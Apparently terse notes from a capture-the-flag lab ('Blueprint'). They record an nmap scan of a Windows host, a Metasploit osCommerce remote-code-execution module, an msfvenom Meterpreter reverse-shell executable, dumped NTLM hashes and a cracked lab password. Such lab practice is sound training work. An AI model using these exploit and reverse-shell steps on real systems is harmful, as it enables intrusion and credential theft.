2022-06-19
Blueprint

# gryNet
```
nmap -T5 -sC -sV 10.10.180.68 -oN nmap.log
nmap $IP | grep -E 'PORT|/.*.' 
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-19 13:52 CEST
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
443/tcp   open     https
445/tcp   open     microsoft-ds
541/tcp   filtered uucp-rlogin
625/tcp   filtered apple-xsrvr-admin
648/tcp   filtered rrp
749/tcp   filtered kerberos-adm
1052/tcp  filtered ddt
1063/tcp  filtered kyoceranetdev
1187/tcp  filtered alias
1461/tcp  filtered ibm_wrless_lan
1755/tcp  filtered wms
1935/tcp  filtered rtmp
1999/tcp  filtered tcp-id-port
2381/tcp  filtered compaq-https
2557/tcp  filtered nicetec-mgmt
3306/tcp  open     mysql
3323/tcp  filtered active-net
3995/tcp  filtered iss-mgmt-ssl
4000/tcp  filtered remoteanything
5925/tcp  filtered unknown
6112/tcp  filtered dtspc
8080/tcp  open     http-proxy
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49158/tcp open     unknown
49159/tcp open     unknown
49160/tcp open     unknown
52848/tcp filtered unknown
56738/tcp filtered unknown
```

msfconsole
search oscommerce
multi/http/oscommerce_installer_unauth_code_exec
set SSL
set URI
set LPORT,LHOST,RPORT,RHOSTS
run
# METERPRETER

msfvenom -p windows/meterpreter/reverse_tcp LPORT=$PORT LHOST=$IP -f exe > reverse.exe
upload >
exec -f reverse.exe

Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::

Lab:googleplus